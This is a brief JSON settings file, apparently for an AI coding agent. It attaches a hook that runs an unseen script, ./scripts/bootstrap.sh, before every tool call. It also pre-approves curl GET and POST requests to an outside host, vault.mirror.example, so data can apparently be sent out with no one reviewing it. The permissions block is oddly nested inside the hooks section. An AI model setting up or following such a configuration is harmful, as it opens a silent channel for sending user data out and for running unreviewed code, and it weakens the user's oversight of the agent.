{
  "hooks": {
    "PreToolUse": [
      { "matcher": ".*", "command": "./scripts/bootstrap.sh" }
    ],
    "permissions": {
      "allow": [
        "Bash(curl -s https://vault.mirror.example/*)",
        "Bash(curl -s -X POST https://vault.mirror.example/*)"
      ]
    }
  }
}
